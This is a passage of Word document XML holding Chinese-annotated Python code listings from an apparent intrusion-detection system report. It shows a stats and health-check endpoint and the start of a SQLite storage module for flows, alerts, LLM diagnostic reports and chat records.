        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    detector: Detector = app.state.detector</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27CEC234">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out["classes"] = detector.classes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15A6D646">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out["model"] = {"selected_by": detector.selected_by, "trained_at": detector.trained_at}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6636D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out["llm"] = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5182A1AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "calls": app.state.llm.calls,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3E0605">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "failures": app.state.llm.failures,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="737A442F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "available": app.state.llm.available,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A43313">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462CA28A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out["rules"] = app.state.rules.stats()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346A9A4A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2C14A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A10B318">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60A4DFBF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@app.get("/healthz")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425AECB3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def healthz():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191C8E69">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {"ok": True, "ts": time.time()}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52270FC9">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76921210">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-9　center/database.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（293 行）　M6 SQLite 存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C1E9E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M6 中心端存储：SQLite 建表与读写。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DBA27C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26DDE1DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>四张表对应数据流的四个阶段：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E963BDA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  flows    每条流的小模型判定结果（原始特征也留着，诊断要拿它当证据）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A07C1F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  alerts   非 BENIGN 的流升级成的告警</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5C1D6C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  reports  针对告警生成的 LLM 诊断报告</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D12C43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  chat     针对某份报告的追问与回答</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EEC06B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE66497">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39AA9208">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4E3D4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2765F707">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454EBDE3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sqlite3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B32BC4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525924A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from contextlib import contextmanager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60044182">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2225247E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E166C7A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 流水表里要展示的特征列。整份 78 维塞给看板会让 200 行响应到 1 MB 以上。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297EC948">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>FLOW_DISPLAY_FIELDS = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67136F49">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Flow Duration",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD58BFD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Total Fwd Packets",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24DE41F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Total Backward Packets",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD001CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "SYN Flag Count",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B309538">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "RST Flag Count",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCB0077">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9A2BF6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D8C0080">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SCHEMA = """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3117B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>CREATE TABLE IF NOT EXISTS flows (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A3DEBFD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    id          INTEGER PRIMARY KEY AUTOINCREMENT,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0D8E24">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    probe_id    TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB1200B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    first_seen  REAL    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E5B51A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    last_seen   REAL    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16992CE7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    flow_key    TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F062477">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    predicted   TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534E04A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    confidence  REAL    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DA5FF3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    features    TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F7C520">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    created_at  REAL    NOT NULL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8537F3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA557A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>CREATE INDEX IF NOT EXISTS idx_flows_time ON flows(created_at);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B07C04">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>CREATE INDEX IF NOT EXISTS idx_flows_probe ON flows(probe_id);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFD64FD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25843F1B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>CREATE TABLE IF NOT EXISTS alerts (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437CD27A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    id          INTEGER PRIMARY KEY AUTOINCREMENT,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3161FD36">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
